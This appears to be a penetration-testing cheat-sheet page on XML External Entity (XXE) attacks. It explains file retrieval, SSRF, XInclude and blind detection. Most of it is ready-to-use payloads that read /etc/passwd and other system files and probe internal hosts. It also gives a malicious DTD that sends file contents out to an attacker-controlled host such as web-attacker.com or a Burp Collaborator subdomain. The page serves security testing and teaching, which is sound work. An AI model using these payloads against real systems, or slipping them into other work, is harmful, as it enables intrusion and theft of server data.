# XXE (XML External Entity)

## XXE to retrieve files

{% code title="Normal XML" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```
{% endcode %}

{% tabs %}
{% tab title="#1" %}
This XXE payload defines an external entity **\&xxe;** whose value is the contents of the **/etc/passwd** file and uses the entity within the value of the **productId**.

{% hint style="info" %}
Windows payload: `file:///c:/windows/win.ini`
{% endhint %}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
{% endtab %}

{% tab title="#2" %}
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```
{% endtab %}
{% endtabs %}

### Tips

* With real-world XXE vulnerabilities, there will often be a large number of data values within the submitted XML, any one of which might be used within the application's response. To test systematically for XXE vulnerabilities, you will generally need to **test each data node in the XML individually**, by making use of your defined entity and seeing whether it appears within the response. Example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <productName>Test</productName>
    <productPrice>12</procductPrice>
</stockCheck>
```

* Remember to change wrappers. [Here](../inclusion-lfi-rfi-traversal/php-wrappers.md#wrappers) is a complete list. The **php://filter** wrapper with **base64** encoding can be very useful.

## Exploiting XXE to perform SSRF attacks

Apart from the recovery of sensitive data, the other main effect of XXE attacks is that they can be used to perform server-side request forgery (SSRF).

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-website.com/"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-website.com/"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-website.com/secret"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-website.com/secret/admin"> ]>
```

## XXE through a modified content type

Most POST requests use a default content type that is generated by HTML forms, such as `application/x-www-form-urlencoded`. Some web sites expect to receive requests in this format but will tolerate other content types, including XML.

For example, if a normal request contains the following:

```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

You could then submit the next application, with the same result:

```
POST /action HTTP/1.0Content-Type: text/xmlContent-Length: 52

<?xml version="1.0" encoding="UTF-8"?>
<foo>bar</foo>
```

If the application tolerates requests that contain XML in the message body, and parses the body content as XML, then it can get to the hidden XXE attack surface by simply reformatting the requests to use XML format.

## XXE through file upload

Some applications allow users to upload files that are then processed on the server. Some common file formats use XML or contain XML subcomponents. Examples of XML-based formats are office document formats such as DOCX and image formats such as SVG.

For example, an application may allow users to upload images and process or validate them on the server after uploading. Even if the application expects to receive a format such as PNG or JPEG, the image processing library being used might support SVG images. Since the SVG format uses XML, an attacker can submit a malicious SVG image and thus reach a hidden attack surface for XXE vulnerabilities.

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#xxe-in-exotic-files" %}

## XInclude attack

Some applications receive the data sent by the client, embed it on the server side in an XML document and then parse the document. An example of this occurs when the data sent by the client is placed in a back-end SOAP request, which is then processed by the back-end SOAP service.

In this situation, you cannot perform a classic XXE attack, because you do not control the entire XML document and therefore cannot define or modify a DOCTYPE element. However, you could use XInclude instead. XInclude is a part of the XML specification that allows you to build an XML document from subdocuments. You can place an XInclude attack inside any data value in an XML document, so the attack can be performed in situations where you only control a single data element that is placed in a server-side XML document.

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## Blind XXE (Detection)

You can detect blind XXEs using the same technique as for SSRF XXE attacks, but by triggering out-of-band network interaction to a system that you control:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

Sometimes XXE attacks using regular entities are blocked. In this situation, you can use XML parameter entities instead. XML parameter entities are a special type of XML entity that can only be referenced elsewhere in the DTD. You need to know the following:

* The declaration of an XML parametric entity includes the percent character before the entity name.
* Parameter entities are referenced using the percent character instead of the usual ampersand.

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2gkax.web-attacker.com"> %xxe; ]>
```

## Blind XXE (Exfiltration)

### Normal

After detecting a blind XXE vulnerability, the attacker must host a malicious DTD on a system he controls, and then invoke the external DTD from the in-band XXE payload:

{% code title="malicious.dtd" %}
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/?x=%file;'>">
%eval;
%exfil;
```
{% endcode %}

{% hint style="danger" %}
The attacker must then host the malicious DTD on a system that they control, normally by loading it onto their own webserver.
{% endhint %}

{% code title="Payload" %}
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```
{% endcode %}

### Via error messages <a href="#exploiting-blind-xxe-to-retrieve-data-via-error-messages" id="exploiting-blind-xxe-to-retrieve-data-via-error-messages"></a>

An alternative approach to exploiting blind XXE is to trigger an XML parsing error where the error message contains the sensitive data that you wish to retrieve. This will be effective if the application returns the resulting error message within its response.

So, for this case, we will only need a web server that hosts the following malicious DTD:

{% code title="malicious.dtd" %}
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
{% endcode %}
